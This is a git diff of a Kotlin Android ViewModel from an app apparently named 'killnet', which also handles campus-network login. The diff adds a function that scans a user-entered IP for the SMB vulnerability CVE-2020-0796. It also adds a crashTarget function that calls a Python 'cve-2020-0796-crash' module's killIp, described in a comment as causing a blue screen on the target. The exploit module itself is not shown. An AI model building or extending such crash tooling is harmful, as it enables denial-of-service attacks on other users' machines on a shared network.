@@ -4,6 +4,7 @@ import android.net.ConnectivityManager
 import android.net.LinkProperties
 import android.net.Network
 import android.net.NetworkCapabilities
+import android.os.Handler
 import android.util.Log
 import androidx.lifecycle.MutableLiveData
 import androidx.lifecycle.Transformations
@@ -13,6 +14,8 @@ import com.chaquo.python.Python
 import com.che.killnet.MyApplication.Companion.context
 import com.che.killnet.wenet.model.DeleteBean
 import com.che.killnet.wenet.model.LoginPostBody
+import kotlinx.coroutines.*
+import kotlin.concurrent.thread
 
 
 class WenetViewModel: ViewModel() {
@@ -22,50 +25,6 @@ class WenetViewModel: ViewModel() {
     //   检测网络
 
     val buttonState = MutableLiveData<String>()
-//    lateinit var IpAddressByWifi: String
-    var IpAddressByWifi = "1"
-
-
-//    fun netCheck() {
-////        获取 ConnectivityManager 的实例
-//        val connectivityManager = context.getSystemService(ConnectivityManager::class.java)
-////        使用此实例获取对应用当前默认网络的引用
-////        val currentNetwork = connectivityManager.activeNetwork
-////        通过对网络的引用，您的应用可以查询有关网络的信息
-//
-//
-//        connectivityManager.registerDefaultNetworkCallback(object :
-//            ConnectivityManager.NetworkCallback() {
-////            override fun onAvailable(network: Network) {
-////                Log.e("test123", "现在的网络是$")
-////            }
-////
-////            override fun onLost(network : Network) {
-////                Log.e("test123", "刚刚断开网络,刚才连接的是 " + network)
-////            }
-////
-////            override fun onCapabilitiesChanged(network : Network, networkCapabilities : NetworkCapabilities) {
-////                Log.e("test123", "The default network changed capabilities: " + networkCapabilities)
-////            }
-//
-//
-//            override fun onLinkPropertiesChanged(network: Network, linkProperties: LinkProperties) {
-//
-//                IpAddressByWifi = NetworkUtils.getIpAddressByWifi()
-//
-//                Log.e("test123", "getIpAddressByWifi,$IpAddressByWifi")
-//
-////                IpAddressByWifi.showToast(context)
-//                if("10.1" in IpAddressByWifi){
-//                    buttonState.postValue("wifi_available")
-//                }else{
-//                    buttonState.postValue("wifi_not_available")
-//                }
-//            }
-//        })
-//
-//
-//    }
 
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -96,6 +55,7 @@ class WenetViewModel: ViewModel() {
 
 
 
+
     /**
      * 登陆校园网
      */
@@ -112,17 +72,53 @@ class WenetViewModel: ViewModel() {
 
 
     }
+
+    val ifVulnerableLiveData = MutableLiveData<Boolean>()
+
     /*
     利用cve-2020-0796蓝屏,执行python代码
      */
     private fun cve(inputString: String) {
-        Log.d("cve", "ip to attack is $inputString")
         // 调用python代码
         val py = Python.getInstance()
+        var ifVulnerable = false
+
+//            ifVulnerable = false
+//            ifVulnerableLiveData.value = ifVulnerable
+
+//            ifVulnerable = py.getModule("cve-2020-0796-scanner").callAttr("scannerIp",inputString).toBoolean()
+
+
+        object : Thread() {
+            override fun run() {
+                try {
+                    ifVulnerable = py.getModule("cve-2020-0796-scanner").callAttr("scannerIp",inputString).toBoolean()
+                    ifVulnerableLiveData.postValue(ifVulnerable)
+                } catch (e: Exception) {
+                }
+
+            }
+        }.start()
+
+        Handler().postDelayed({
+            if(!ifVulnerable){
+                ifVulnerableLiveData.value = ifVulnerable
+                Log.e("cve", "$ifVulnerable")
+
+            }
+        }, 300)
+
+        Log.e("cve", "continue")
+
+
+
+    }
+
+    fun crashTarget(inputString: String) {
         try {
-            py.getModule("cve-2020-0796-crash").callAttr("killIp",inputString);
+            val py = Python.getInstance()
+            py.getModule("cve-2020-0796-crash").callAttr("killIp",inputString)
         } catch (e: Exception) {
-            print(e.message)
         }
     }
 
@@ -133,7 +129,6 @@ class WenetViewModel: ViewModel() {
 //            "http://10.16.0.12:8081/?usermac=XX:XX:XX:XX:XX:XX&userip=MYIP&origurl=http://edge.microsoft.com/captiveportal/generate_204&nasip=10.100.0.1"
         var url =
             "http://10.16.0.21/?usermac=XX:XX:XX:XX:XX:XX&userip=MYIP&origurl=http://edge.microsoft.com/captiveportal/generate_204&nasip=10.100.0.1"
-        url = url.replace("MYIP", IpAddressByWifi)
 
         val loginPostBody = LoginPostBody(
             redirectUrl = url,
